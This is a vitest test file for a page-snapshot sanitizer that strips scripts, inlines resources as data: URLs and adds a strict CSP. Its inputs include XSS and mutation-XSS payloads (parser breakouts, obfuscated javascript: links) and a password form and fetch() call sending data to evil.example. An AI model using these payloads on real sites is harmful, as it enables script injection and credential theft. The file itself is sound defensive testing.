/**
 * freeze: a kept page as an inert string. Checked by a second parser
 * (happy-dom's), never by the scanner that wrote it:
 *
 *   D1  inert: no script, no on* attribute, no http-equiv but ours, no
 *       javascript:, no <base>, no prefetch-family link.
 *   D2  no network: every load position, from a table written here, is a
 *       data: URL or the absolute URL of a resource that was not kept; and
 *       the first element in <head> is our CSP.
 *   D3  faithful: each data: URL decodes to exactly the kept bytes and type.
 *   D4  a capture of the export finds nothing to fetch but what was not kept.
 *   D5  exporting twice gives the same bytes.
 */
import { describe, it, expect } from "vitest"
import { freeze, freezeCss, CSP, PREFIX, rfc1123 } from "./freeze.js"
import { dataUrl, fromDataUrl } from "./bytes.js"
import { scanHtml } from "./scan.js"
import { pageLinks, withoutFragment } from "./links.js"
import { cssLinks } from "./css.js"

const PAGE = "https://site.test/dir/page.html"
const at = (path) => new URL(path, PAGE).href
const text = (s) => new TextEncoder().encode(s)

/** Distinct bytes for each URL, so a data: URL names exactly one. */
function bytesFor(url, kind) {
  const magic = kind === "font" ? [0x77, 0x4f, 0x46, 0x32] : [0x89, 0x50, 0x4e, 0x47]
  return new Uint8Array([...magic, ...text(url)])
}
const MIME = { image: "image/png", font: "font/woff2", style: "text/css" }
/** The type each is written back as: a stylesheet is re-encoded as UTF-8, and says so. */
const WRITTEN = { ...MIME, style: "text/css;charset=utf-8" }

/**
 * A snapshot of `html` in which every URL in `found` was fetched: kept when
 * `kept`, unreachable otherwise. `sheets` gives stylesheets their text.
 */
function snapshot(html, found, { kept = true, sheets = {}, keep = null } = {}) {
  const resources = {}
  const blobs = {}
  for (const [url, kind] of Object.entries(found)) {
    const ok = keep ? keep(url) : kept
    if (!ok) {
      resources[url] = { kind, from: "page", order: "0", outcome: "unreachable", detail: "CORS or network" }
      continue
    }
    const bytes = kind === "style" ? text(sheets[url] ?? "") : bytesFor(url, kind)
    const sha = `sha-${url}`
    blobs[sha] = bytes
    resources[url] = { kind, from: "page", order: "0", outcome: "ok", mimeType: MIME[kind], sha256: sha, bytes: bytes.byteLength, finalUrl: url, charset: "utf-8" }
  }
  return {
    "@patchwork": { type: "web-snapshot" },
    title: "Page",
    source: PAGE,
    capture: { at: Date.UTC(2026, 10, 16, 10, 2), finalUrl: PAGE, via: "reader", engine: "reader-dom", sha256: "abc123", bytes: html.length },
    html: text(html),
    charset: "utf-8",
    base: PAGE,
    resources,
    blobs,
  }
}

/**
 * The second parser: happy-dom's, through a template so that nothing is
 * moved or dropped (its document parser discards what precedes an <html>
 * tag). It is a cruder parser than a browser's — it reads a textarea's
 * contents as markup, for one — which makes it a harsher judge of D1.
 */
const parse = (html) => {
  const template = document.createElement("template")
  template.innerHTML = html
  return template.content
}

/**
 * Every load position: the markup, and where each load ends up — [selector,
 * attribute, absolute URL, kind, gone]. Written from the table in links.js,
 * not read from it. `gone` marks a position that is removed when its
 * resource was not kept: an icon (the browser fetches it from outside the
 * page), and a picture <source> (so the <img> shows instead).
 */
const ROWS = [
  ["link stylesheet", `<link rel="stylesheet" href="s.css">`, [["link", "href", at("s.css"), "style"]]],
  ["link icon", `<link rel="icon" href="i.ico">`, [["link", "href", at("i.ico"), "image", true]]],
  ["link apple-touch-icon", `<link rel="apple-touch-icon" href="t.png">`, [["link", "href", at("t.png"), "image", true]]],
  ["link mask-icon", `<link rel="mask-icon" href="m.svg">`, [["link", "href", at("m.svg"), "image", true]]],
  ["img src", `<img src="a.png">`, [["img", "src", at("a.png"), "image"]]],
  ["img data-src", `<img src="data:image/gif;base64,R0lG" data-src="lazy.png">`, [["img", "src", at("lazy.png"), "image"]]],
  ["img data-lazy-src", `<img data-lazy-src="lazy2.png">`, [["img", "src", at("lazy2.png"), "image"]]],
  ["img srcset", `<img srcset="c1.png 1x, c2.png 2x">`, [["img", "src", at("c2.png"), "image"]]],
  ["picture source srcset", `<picture><source srcset="p1.png 1x, p2.png 2x"><img src="pi.png"></picture>`, [["source", "srcset", at("p2.png"), "image", true], ["img", "src", at("pi.png"), "image"]]],
  ["input image", `<input type="image" src="in.png">`, [["input", "src", at("in.png"), "image"]]],
  ["video poster", `<video poster="po.png"></video>`, [["video", "poster", at("po.png"), "image"]]],
  ["body background", `<body background="bg.png"></body>`, [["[background]", "background", at("bg.png"), "image"]]],
  ["table background", `<table background="tb.png"><tr><td background="td.png"></td><th background="th.png"></th></tr></table>`, [["table", "background", at("tb.png"), "image"], ["td", "background", at("td.png"), "image"], ["th", "background", at("th.png"), "image"]]],
  ["svg image href", `<svg><image href="si.png" /></svg>`, [["image", "href", at("si.png"), "image"]]],
  ["svg image xlink:href", `<svg><image xlink:href="sx.png" /></svg>`, [["image", "xlink:href", at("sx.png"), "image"]]],
  ["feImage", `<svg><filter><feImage href="fe.png" /></filter></svg>`, [["feImage", "href", at("fe.png"), "image"]]],
  ["use, with a fragment", `<svg><use href="sp.svg#icon" /></svg>`, [["use", "href", `${at("sp.svg")}#icon`, "image"]]],
  ["use xlink:href", `<svg><use xlink:href="ux.svg#i" /></svg>`, [["use", "xlink:href", `${at("ux.svg")}#i`, "image"]]],
]
/** Loads written in CSS on the page: [markup, the URL, how to find the CSS text in the parsed page]. */
const CSS_ROWS = [
  ["style attribute", `<div style="background:url(st.png)"></div>`, at("st.png"), (doc) => doc.querySelector("div").getAttribute("style")],
  ["style element", `<style>b{background:url('se.png')}</style>`, at("se.png"), (doc) => doc.querySelector("style").textContent],
]

/** The URLs a value or a CSS text loads: url() contents, unquoted. */
const cssUrls = (css) => [...css.matchAll(/url\(\s*(?:"((?:[^"\\]|\\.)*)"|([^)\s]*))\s*\)/g)].map((m) => (m[1] ?? m[2]).replace(/\\(.)/g, "$1"))

describe("D2 and D3: every load position, kept and not kept", () => {
  for (const [name, html, positions] of ROWS) {
    for (const kept of [true, false]) {
      it(`${name} · ${kept ? "kept" : "not kept"}`, () => {
        const found = Object.fromEntries(positions.map(([, , url, kind]) => [withoutFragment(url), kind]))
        const doc = snapshot(html, found, { kept })
        const page = parse(freeze(doc))
        for (const [selector, attr, url, kind, gone] of positions) {
          const value = page.querySelector(selector)?.getAttribute(attr) ?? null
          const key = withoutFragment(url)
          if (!kept) {
            expect(value, `${selector}[${attr}]`).toBe(gone ? null : url)
            continue
          }
          const fragment = url.slice(key.length)
          expect(value.endsWith(fragment)).toBe(true)
          const decoded = fromDataUrl(value.slice(0, value.length - fragment.length))
          // D3: exactly the kept bytes, as the kept type.
          expect(decoded.mimeType).toBe(WRITTEN[kind])
          if (kind !== "style") expect([...decoded.bytes]).toEqual([...doc.blobs[doc.resources[key].sha256]])
        }
      })
    }
  }

  for (const [name, html, url, cssOf] of CSS_ROWS) {
    for (const kept of [true, false]) {
      it(`${name} · ${kept ? "kept" : "not kept"}`, () => {
        const doc = snapshot(html, { [url]: "image" }, { kept })
        const [value] = cssUrls(cssOf(parse(freeze(doc))))
        if (!kept) expect(value).toBe(url)
        else expect([...fromDataUrl(value).bytes]).toEqual([...bytesFor(url, "image")])
      })
    }
  }

  it("a kept stylesheet becomes its frozen self: imports, fonts and images inside it rewritten, recursively", () => {
    const sheets = {
      [at("s.css")]: `@import "t.css"; x{background:url(ci.png)} @font-face{src:url(f.woff2)} y{background:url(gone.png)}`,
      [at("t.css")]: `z{background:url(ti.png)}`,
    }
    const found = { [at("s.css")]: "style", [at("t.css")]: "style", [at("ci.png")]: "image", [at("f.woff2")]: "font", [at("ti.png")]: "image", [at("gone.png")]: "image" }
    const doc = snapshot(`<link rel=stylesheet href=s.css>`, found, { sheets, keep: (u) => !u.endsWith("gone.png") })
    const href = parse(freeze(doc)).querySelector("link").getAttribute("href")
    const outer = new TextDecoder().decode(fromDataUrl(href).bytes)
    const [imported, image, font, gone] = cssUrls(outer)
    expect(fromDataUrl(image).bytes).toEqual(bytesFor(at("ci.png"), "image"))
    expect(fromDataUrl(font).mimeType).toBe("font/woff2")
    expect(gone).toBe(at("gone.png"))
    const inner = new TextDecoder().decode(fromDataUrl(imported).bytes)
    expect(fromDataUrl(cssUrls(inner)[0]).bytes).toEqual(bytesFor(at("ti.png"), "image"))
  })

  it("a kept sheet in a legacy encoding reads as the same text in a browser", () => {
    // How a browser decodes a sheet (CSS Syntax §3.2): the charset its
    // protocol gives — a data: URL's parameter — else its @charset rule at
    // byte 0, else utf-8.
    const browserCss = (url) => {
      const { mimeType, bytes } = fromDataUrl(url)
      const protocol = mimeType.match(/;\s*charset=([^;]+)/i)?.[1]
      const rule = new TextDecoder("latin1").decode(bytes.subarray(0, 1024)).match(/^@charset "([^"]*)";/)?.[1]
      return new TextDecoder(protocol ?? rule ?? "utf-8").decode(bytes)
    }
    const url = at("l.css")
    const bytes = new Uint8Array([...text(`@charset "iso-8859-1";p::before{content:"caf`), 0xe9, ...text(`"}`)])
    const doc = snapshot(`<link rel=stylesheet href=l.css>`, { [url]: "style" })
    doc.blobs[doc.resources[url].sha256] = bytes
    Object.assign(doc.resources[url], { charset: "windows-1252", bytes: bytes.byteLength })
    const href = parse(freeze(doc)).querySelector("link").getAttribute("href")
    expect(browserCss(href)).toBe(`@charset "iso-8859-1";p::before{content:"café"}`)
  })

  it("a picture's <source> whose image was not kept steps aside for the <img>", () => {
    const doc = snapshot(`<picture><source srcset="p1.png 1x, p2.png 2x"><img src="pi.png"></picture>`, { [at("p2.png")]: "image", [at("pi.png")]: "image" }, { keep: (u) => u.endsWith("pi.png") })
    const page = parse(freeze(doc))
    expect(page.querySelector("source").hasAttribute("srcset")).toBe(false)
    expect([...fromDataUrl(page.querySelector("img").getAttribute("src")).bytes]).toEqual([...bytesFor(at("pi.png"), "image")])
  })

  it("an @import cycle ends in an absolute URL", () => {
    const a = at("a.css")
    const b = at("b.css")
    const doc = snapshot(`<link rel=stylesheet href=a.css>`, { [a]: "style", [b]: "style" }, { sheets: { [a]: `@import "b.css";`, [b]: `@import "a.css";` } })
    const outer = new TextDecoder().decode(fromDataUrl(parse(freeze(doc)).querySelector("link").getAttribute("href")).bytes)
    const inner = new TextDecoder().decode(fromDataUrl(cssUrls(outer)[0]).bytes)
    expect(cssUrls(inner)).toEqual([a])
    expect(freezeCss(`@import "a.css";`, PAGE, doc.resources, doc.blobs, new Set([a]))).toBe(`@import url("${a}");`)
  })

  it("policy loads are made absolute, so nothing resolves against the page showing the frame", () => {
    const html = `<iframe src="f.html"></iframe><video src="v.mp4"></video><audio src="au.mp3"></audio><video><source src="s.mp4"><track src="t.vtt"></video><object data="o.swf"></object><embed src="e.swf">`
    const page = parse(freeze(snapshot(html, {})))
    expect([
      page.querySelector("iframe").getAttribute("src"),
      page.querySelector("video").getAttribute("src"),
      page.querySelector("audio").getAttribute("src"),
      page.querySelector("source").getAttribute("src"),
      page.querySelector("track").getAttribute("src"),
      page.querySelector("object").getAttribute("data"),
      page.querySelector("embed").getAttribute("src"),
    ]).toEqual([at("f.html"), at("v.mp4"), at("au.mp3"), at("s.mp4"), at("t.vtt"), at("o.swf"), at("e.swf")])
  })

  it("links are absolute and open in a new tab, without the page's own target or rel", () => {
    const page = parse(freeze(snapshot(`<a href="/p" target="_self" rel="opener">p</a><map><area href="q"></map><a href="#here">here</a><a href="data:text/html,x">d</a>`, {})))
    const [a, , fragment, data] = page.querySelectorAll("a, area")
    expect([a.getAttribute("href"), a.getAttribute("target"), a.getAttribute("rel")]).toEqual(["https://site.test/p", "_blank", "noopener noreferrer"])
    expect(page.querySelector("area").getAttribute("href")).toBe(at("q"))
    // A link within the page stays one; a data: link goes nowhere.
    expect([fragment.getAttribute("href"), fragment.getAttribute("target")]).toEqual(["#here", null])
    expect(data.getAttribute("href")).toBe("#")
  })
})

describe("D1: inert", () => {
  const REMOVED = [
    ["inline script", `<script>alert(1)</script><p>ok</p>`],
    ["script src", `<script src="x.js"></script><p>ok</p>`],
    ["unterminated script", `<p>ok</p><script>alert(1)`],
    ["script in svg", `<svg><script>alert(1)</script></svg><p>ok</p>`],
    ["noscript", `<noscript><img src="n.png"></noscript><p>ok</p>`],
    ["base", `<base href="https://evil.test/"><p>ok</p>`],
    ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.test/"><p>ok</p>`],
    ["meta refresh, HTTP-EQUIV", `<meta HTTP-EQUIV="Refresh" content="0;url=https://evil.test/"><p>ok</p>`],
    ["meta refresh, unquoted", `<meta http-equiv=refresh content=0><p>ok</p>`],
    ["a stored CSP", `<meta http-equiv="Content-Security-Policy" content="default-src *"><p>ok</p>`],
    ["meta charset", `<meta charset="latin1"><p>ok</p>`],
    ...["preload", "prefetch", "modulepreload", "dns-prefetch", "preconnect", "prerender", "manifest"].map((rel) => [`link rel=${rel}`, `<link rel="${rel}" href="x"><p>ok</p>`]),
    ["onclick", `<p onclick="alert(1)">ok</p>`],
    ["onload on body", `<body onload="alert(1)"><p>ok</p></body>`],
    ["onerror, repeated", `<img src="a.png" onerror="one()" ONERROR="two()" onerror="three()"><p>ok</p>`],
    ["integrity, nonce, ping", `<link rel=stylesheet href=s.css integrity="sha384-x" nonce="n"><a href="x" ping="https://track.test/">ok</a>`],
    ["form action, formaction", `<form action="https://evil.test/"><button formaction="https://evil.test/">ok</button></form>`],
    ["html manifest", `<html manifest="x.appcache"><p>ok</p></html>`],
    ["javascript: href", `<a href="javascript:alert(1)">ok</a>`],
    ["javascript: hidden by a tab entity", `<a href="java&#9;script:alert(1)">ok</a>`],
    ["javascript: in an iframe", `<iframe src="javascript:alert(1)"></iframe><p>ok</p>`],
    ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe><p>ok</p>`],
  ]

  /** Every D1 property of a parsed frozen page. */
  function assertInert(html) {
    const page = parse(html)
    expect(page.querySelectorAll("script").length).toBe(0)
    expect(page.querySelectorAll("base").length).toBe(0)
    for (const el of page.querySelectorAll("*")) {
      for (const { name, value } of el.attributes) {
        expect(name.startsWith("on"), `${el.tagName} ${name}`).toBe(false)
        expect(["integrity", "nonce", "ping", "action", "formaction", "manifest", "srcdoc"]).not.toContain(name)
        expect(/^\s*(javascript|vbscript):/i.test(value.replace(/[\t\n\r]/g, "")), `${el.tagName} ${name}=${value}`).toBe(false)
      }
      if (el.tagName === "LINK") {
        const rels = (el.getAttribute("rel") ?? "").toLowerCase().split(/\s+/)
        expect(rels.some((r) => ["preload", "prefetch", "modulepreload", "dns-prefetch", "preconnect", "prerender", "manifest"].includes(r))).toBe(false)
      }
    }
    // Ours, and only ours, carry http-equiv.
    const equiv = [...page.querySelectorAll("[http-equiv]")].map((m) => m.getAttribute("http-equiv"))
    expect(equiv.filter((e) => !["Content-Security-Policy", "x-dns-prefetch-control", "Memento-Datetime"].includes(e))).toEqual([])
    expect(equiv.filter((e) => e === "Content-Security-Policy")).toHaveLength(1)
    // And as text: every http-equiv after our prefix is renamed.
    const rest = html.slice(html.indexOf(PREFIX) + PREFIX.length).replace(/^<meta http-equiv="Memento-Datetime"/, "")
    for (const match of rest.matchAll(/http-equiv/gi)) expect(rest.slice(Math.max(0, match.index - 7), match.index)).toBe("data-x-")
    // D2's other half: nothing but a doctype comes before our CSP. Checked
    // on the string: happy-dom's parser does not move a leading <meta> into
    // <head> as a browser's does (probe P5 checks that in Chrome).
    expect(html.replace(/^<!doctype[^>]*>/i, "").startsWith(`<meta http-equiv="Content-Security-Policy" content="${CSP}">`)).toBe(true)
    expect(page.querySelector("meta").getAttribute("content")).toBe(CSP)
  }

  it.each(REMOVED)("%s", (_, html) => {
    const out = freeze(snapshot(html, {}))
    assertInert(out)
    assertInert(freeze(snapshot(html, {}), { export: true }))
    // What the page said is still there.
    expect(parse(out).textContent).toContain("ok")
  })

  it("renames http-equiv wherever it is written, text included", () => {
    const out = freeze(snapshot(`<p>the http-equiv attribute</p><textarea><meta http-equiv=refresh content=0></textarea>`, {}))
    assertInert(out)
    expect(parse(out).querySelector("p").textContent).toBe("the data-x-http-equiv attribute")
    expect(out).toContain("<textarea>&lt;meta data-x-http-equiv=refresh content=0></textarea>")
  })

  // Where the scanner reads a refresh as text — an attribute value, a
  // comment, raw text — it is renamed all the same, since renaming is done to
  // the whole output: were a browser to read that text as a tag, it would
  // find no http-equiv in it.
  it.each([
    ["an attribute value", `<p title="<meta http-equiv=refresh content=0>">ok</p>`],
    ["a comment", `<!-- <meta http-equiv=refresh content=0> --><p>ok</p>`],
    ["raw text", `<iframe><meta http-equiv=refresh content=0></iframe><p>ok</p>`],
    ["a CDATA section", `<svg><text><![CDATA[<meta http-equiv=refresh content=0>]]></text></svg><p>ok</p>`],
  ])("a refresh the scanner reads as text, in %s, is still renamed", (_, html) => {
    const out = freeze(snapshot(html, {}))
    assertInert(out)
    const body = out.slice(out.indexOf(PREFIX) + PREFIX.length)
    expect(body).toContain("data-x-http-equiv=refresh")
    expect(body).not.toMatch(/(?<!data-x-)http-equiv/i)
  })

  it("keeps the doctype first, then our prefix", () => {
    const out = freeze(snapshot(`<!DOCTYPE html><html><head><title>t</title></head><body>ok</body></html>`, {}))
    expect(out.startsWith(`<!DOCTYPE html>${PREFIX}<html>`)).toBe(true)
  })
})

describe("export", () => {
  const html = `<!doctype html><title>Page</title><link rel=stylesheet href=s.css><img src=a.png><img src=gone.png><img data-src=lazy.png><picture><source srcset="p.png 2x"><img src=pi.png></picture><a href=next.html>next</a><img src=lo.png data-src=hi.png><img src=a2.png data-lazy-src=b2.png>`
  const found = { [at("s.css")]: "style", [at("a.png")]: "image", [at("gone.png")]: "image", [at("lazy.png")]: "image", [at("p.png")]: "image", [at("pi.png")]: "image", [at("lo.png")]: "image", [at("a2.png")]: "image" }

  it("carries the Memento tags and our marker", () => {
    const out = freeze(snapshot(html, found), { export: true })
    const page = parse(out)
    expect(page.querySelector('meta[http-equiv="Memento-Datetime"]').getAttribute("content")).toBe("Mon, 16 Nov 2026 10:02:00 GMT")
    expect(rfc1123(Date.UTC(2026, 10, 16, 10, 2))).toBe("Mon, 16 Nov 2026 10:02:00 GMT")
    expect(page.querySelector('link[rel="original"]').getAttribute("href")).toBe(PAGE)
    expect(page.querySelector('meta[name="patchwork-snapshot"]').getAttribute("content")).toBe("abc123")
  })

  it("D4: a capture of the export finds nothing to fetch but what was not kept", () => {
    // Not kept, a picture <source> is removed, so it is not found again either.
    const removed = new Set([at("p.png")])
    for (const keep of [() => true, (u) => !u.endsWith("gone.png"), () => false]) {
      const doc = snapshot(html, found, { sheets: { [at("s.css")]: "x{}" }, keep })
      const out = freeze(doc, { export: true })
      const fetchable = pageLinks(scanHtml(out), PAGE)
        .filter((l) => !l.policy && !l.nav && !l.bad)
        .map((l) => withoutFragment(l.url))
      const notKept = Object.entries(doc.resources).filter(([, r]) => r.outcome !== "ok").map(([u]) => u)
      expect(new Set(fetchable)).toEqual(new Set(notKept.filter((u) => !removed.has(u))))
    }
  })

  it("D5: exporting twice gives the same bytes", () => {
    const doc = snapshot(html, found, { sheets: { [at("s.css")]: "x{background:url(a.png)}" } })
    const first = freeze(doc, { export: true })
    expect(freeze(doc, { export: true })).toBe(first)
    expect(freeze(structuredClone(doc), { export: true })).toBe(first)
  })

  it("encodes kept bytes as standard base64", () => {
    expect(dataUrl("image/png", new Uint8Array([0, 1, 2, 3, 254, 255]))).toBe("data:image/png;base64,AAECA/7/")
    expect(fromDataUrl("data:image/png;base64,AAECA/7/").bytes).toEqual(new Uint8Array([0, 1, 2, 3, 254, 255]))
    for (const n of [0, 1, 2, 3, 4, 5]) {
      const bytes = Uint8Array.from({ length: n }, (_, i) => i * 37)
      expect(fromDataUrl(dataUrl("x/y", bytes)).bytes).toEqual(bytes)
    }
  })
})

/** What freeze writes after its prefix, for a page in which `found` was fetched. */
const bodyOf = (html, found = {}, options = {}) => {
  const out = freeze(snapshot(html, found, options))
  return out.slice(out.indexOf(PREFIX) + PREFIX.length)
}
const R = (path) => `src="${at(path)}"`

describe("the policy", () => {
  it("allows nothing but data: images, media, styles and fonts; no frame, no form submission, no <base>", () => {
    const directives = Object.fromEntries(CSP.split(";").map((d) => d.trim().split(/\s+/)).map(([name, ...values]) => [name, values]))
    expect(directives).toEqual({
      "default-src": ["'none'"],
      "img-src": ["data:"],
      "media-src": ["data:"],
      "style-src": ["data:", "'unsafe-inline'"],
      "font-src": ["data:"],
      // form-action and base-uri do not fall back to default-src: they must be said.
      "frame-src": ["'none'"],
      "form-action": ["'none'"],
      "base-uri": ["'none'"],
    })
  })
})

describe("where a browser reads markup the scanner might not", () => {
  // Each: the page, and exactly what freeze writes, from the rules: a comment
  // ends at "-->" or "--!>"; integration points by namespace; an end tag that
  // closes an HTML ancestor leaves foreign content; and every "<" the scanner
  // read as text is escaped, so that if a browser reads the region as markup
  // it finds no tag the scanner did not rewrite.
  const CASES = [
    [
      "a comment ended by --!>",
      `<p>hi<!-- --!><form action="https://evil.example/steal"><input name=pw type=password><button formaction="https://evil.example/2">Sign in</button></form><img src=x onerror=alert(1)><base href="https://evil.example/"> -->`,
      `<p>hi<!-- --!><form ><input name=pw type=password><button >Sign in</button></form><img ${R("x")} > -->`,
    ],
    [
      "a style in a MathML text integration point is raw text",
      `<math><mi><style><a title="</style><form action=https://evil.example/s><button>Go</button></form><img src=rel.png onerror=alert(1)>"></a></style></mi></math>`,
      `<math><mi><style>\\3c a title="</style><form ><button>Go</button></form><img ${R("rel.png")} >"></a></style></mi></math>`,
    ],
    [
      "a style in a MathML title is foreign, and a <p> breaks out of it",
      `<math><title><style><p><form action=https://evil.example/s><button>Go</button></form><img src=rel.png onerror=alert(1)></style></title></math>`,
      `<math><title><style><p><form ><button>Go</button></form><img ${R("rel.png")} ></style></title></math>`,
    ],
    [
      "</div> closes the svg inside it",
      `<div><svg></div><style><a title="</style><img src=rel.png onerror=alert(1)><form action=https://evil.example/s><button>x</button></form>">`,
      `<div><svg></div><style>\\3c a title="</style><img ${R("rel.png")} ><form ><button>x</button></form>">`,
    ],
    ["</p> breaks out of svg", `<svg></p><style><a title="</style><img src=rel.png onerror=alert(1)>">`, `<svg></p><style>\\3c a title="</style><img ${R("rel.png")} >">`],
    [
      "an attribute value never holds a <",
      `<svg><style><a title="</style><img src=rel.png onerror=alert(1)>"></a></style></svg>`,
      `<svg><style><a title="&lt;/style>&lt;img src=rel.png onerror=alert(1)>"></a></style></svg>`,
    ],
    ["an unquoted one neither", `<p title=a<b>x</p>`, `<p title=a&lt;b>x</p>`],
    ["a comment never holds a <", `<svg><style><!-- </style><img src=rel.png onerror=alert(1)> --></style></svg>`, `<svg><style><!-- &lt;/style>&lt;img src=rel.png onerror=alert(1)> --></style></svg>`],
    ["a bogus comment neither", `</ <p title="><img src=rel.png onerror=alert(1)>">`, `</ &lt;p title="><img ${R("rel.png")} >">`],
    ["a CDATA section in a style becomes escaped text", `<svg><style><![CDATA[</style><img src=rel.png onerror=alert(1)>]]></style></svg>`, `<svg><style>&lt;/style>&lt;img src=rel.png onerror=alert(1)></style></svg>`],
    ["any CDATA section does", `<svg><text><![CDATA[a<b&c]]></text></svg>`, `<svg><text>a&lt;b&amp;c</text></svg>`],
    ["an end tag's attributes go", `<svg><style></x a="</style><img src=rel.png onerror=alert(1)>"></style></svg>`, `<svg><style></x></style></svg>`],
    ["a tag the input ends inside goes", `<svg><style><x a="</style><img src=rel.png onerror=alert(1)>`, `<svg><style>`],
    [
      "raw text and RCDATA hold no <",
      `<title>a<b &amp; c</title><textarea><img src=x></textarea><xmp><b></xmp><iframe><img src=x></iframe><noembed><img></noembed><noframes><img></noframes><style>a::after{content:"<"}</style>`,
      `<title>a&lt;b &amp; c</title><textarea>&lt;img src=x></textarea><xmp>&lt;b></xmp><iframe>&lt;img src=x></iframe><noembed>&lt;img></noembed><noframes>&lt;img></noframes><style>a::after{content:"\\3c "}</style>`,
    ],
    ["plaintext holds no <", `<plaintext><img src=x>`, `<plaintext>&lt;img src=x>`],
    [
      "an svg <a> navigates like an HTML one; data: and javascript: go nowhere; SMIL may not set an href",
      `<svg><a xlink:href="https://evil.example/"><text>click</text></a><a xlink:href="data:text/html,<b>x</b>" target=_blank>d</a><a xlink:href="java&Tab;script:alert(1)">j</a><a><set attributeName="href" to="https://evil.example/smil"/><text>s</text></a><animate attributeName="xlink:href" values="https://a.example/;https://b.example/"/></svg>`,
      `<svg><a target="_blank" rel="noopener noreferrer" xlink:href="https://evil.example/"><text>click</text></a><a xlink:href="#" target=_blank>d</a><a xlink:href="#">j</a><a><set  /><text>s</text></a><animate  /></svg>`,
    ],
    ["&colon; and &NewLine; spell javascript: too", `<a href="javascript&colon;alert(1)">a</a><a href="&NewLine;javascript:alert(1)">b</a>`, `<a href="#">a</a><a href="#">b</a>`],
    [
      "an escaped url( or @import in CSS is one",
      `<div style="background:\\75 rl(https://evil.example/a.png)"></div><style>@\\69mport "https://evil.example/x.css"; b{background:\\75 rl(rel.png)}</style>`,
      `<div style="background:url(&quot;https://evil.example/a.png&quot;)"></div><style>@\\69mport url("https://evil.example/x.css"); b{background:url("${at("rel.png")}")}</style>`,
    ],
    ["<image> is an img", `<image src="rel.png">`, `<image ${R("rel.png")}>`],
    [
      "a data: or blob: frame, object or embed loads nothing",
      `<iframe src="data:text/html,<img src=https://evil.example/beacon><script>fetch('https://evil.example/x')</script>"></iframe><object data="data:text/html,x"></object><embed src="blob:https://site.test/y"><frameset><frame src="data:,x"></frameset>`,
      `<iframe ></iframe><object ></object><embed ><frameset><frame ></frameset>`,
    ],
    ["an icon not kept is removed, extra icons too", `<link rel=icon href="/a.png"><link rel="icon" sizes=32x32 href="/b.png"><p>ok</p>`, `<p>ok</p>`],
  ]
  it.each(CASES)("%s", (_, html, expected) => {
    expect(bodyOf(html)).toBe(expected)
  })

  it("a kept image's fragment cannot end its url()", () => {
    const html = `<div style='background:url("a.png#);background-image:url(https://evil.example/x.png);x:(")'></div>`
    const style = parse(freeze(snapshot(html, { [at("a.png")]: "image" }))).querySelector("div").getAttribute("style")
    // One url(), whose whole argument is the kept image and the fragment.
    expect(cssLinks(style, PAGE)).toEqual([])
    const [value] = cssUrls(style)
    expect(value.startsWith(dataUrl("image/png", bytesFor(at("a.png"), "image")))).toBe(true)
    expect(value.endsWith("#);background-image:url(https://evil.example/x.png);x:(")).toBe(true)
  })

  it("only the first icon is kept, and only when it was fetched", () => {
    const first = at("/a.png")
    const kept = dataUrl("image/png", bytesFor(first, "image"))
    expect(bodyOf(`<link rel=icon href="/a.png"><link rel="icon" sizes=32x32 href="/b.png">`, { [first]: "image" })).toBe(`<link rel=icon href="${kept}">`)
  })
})
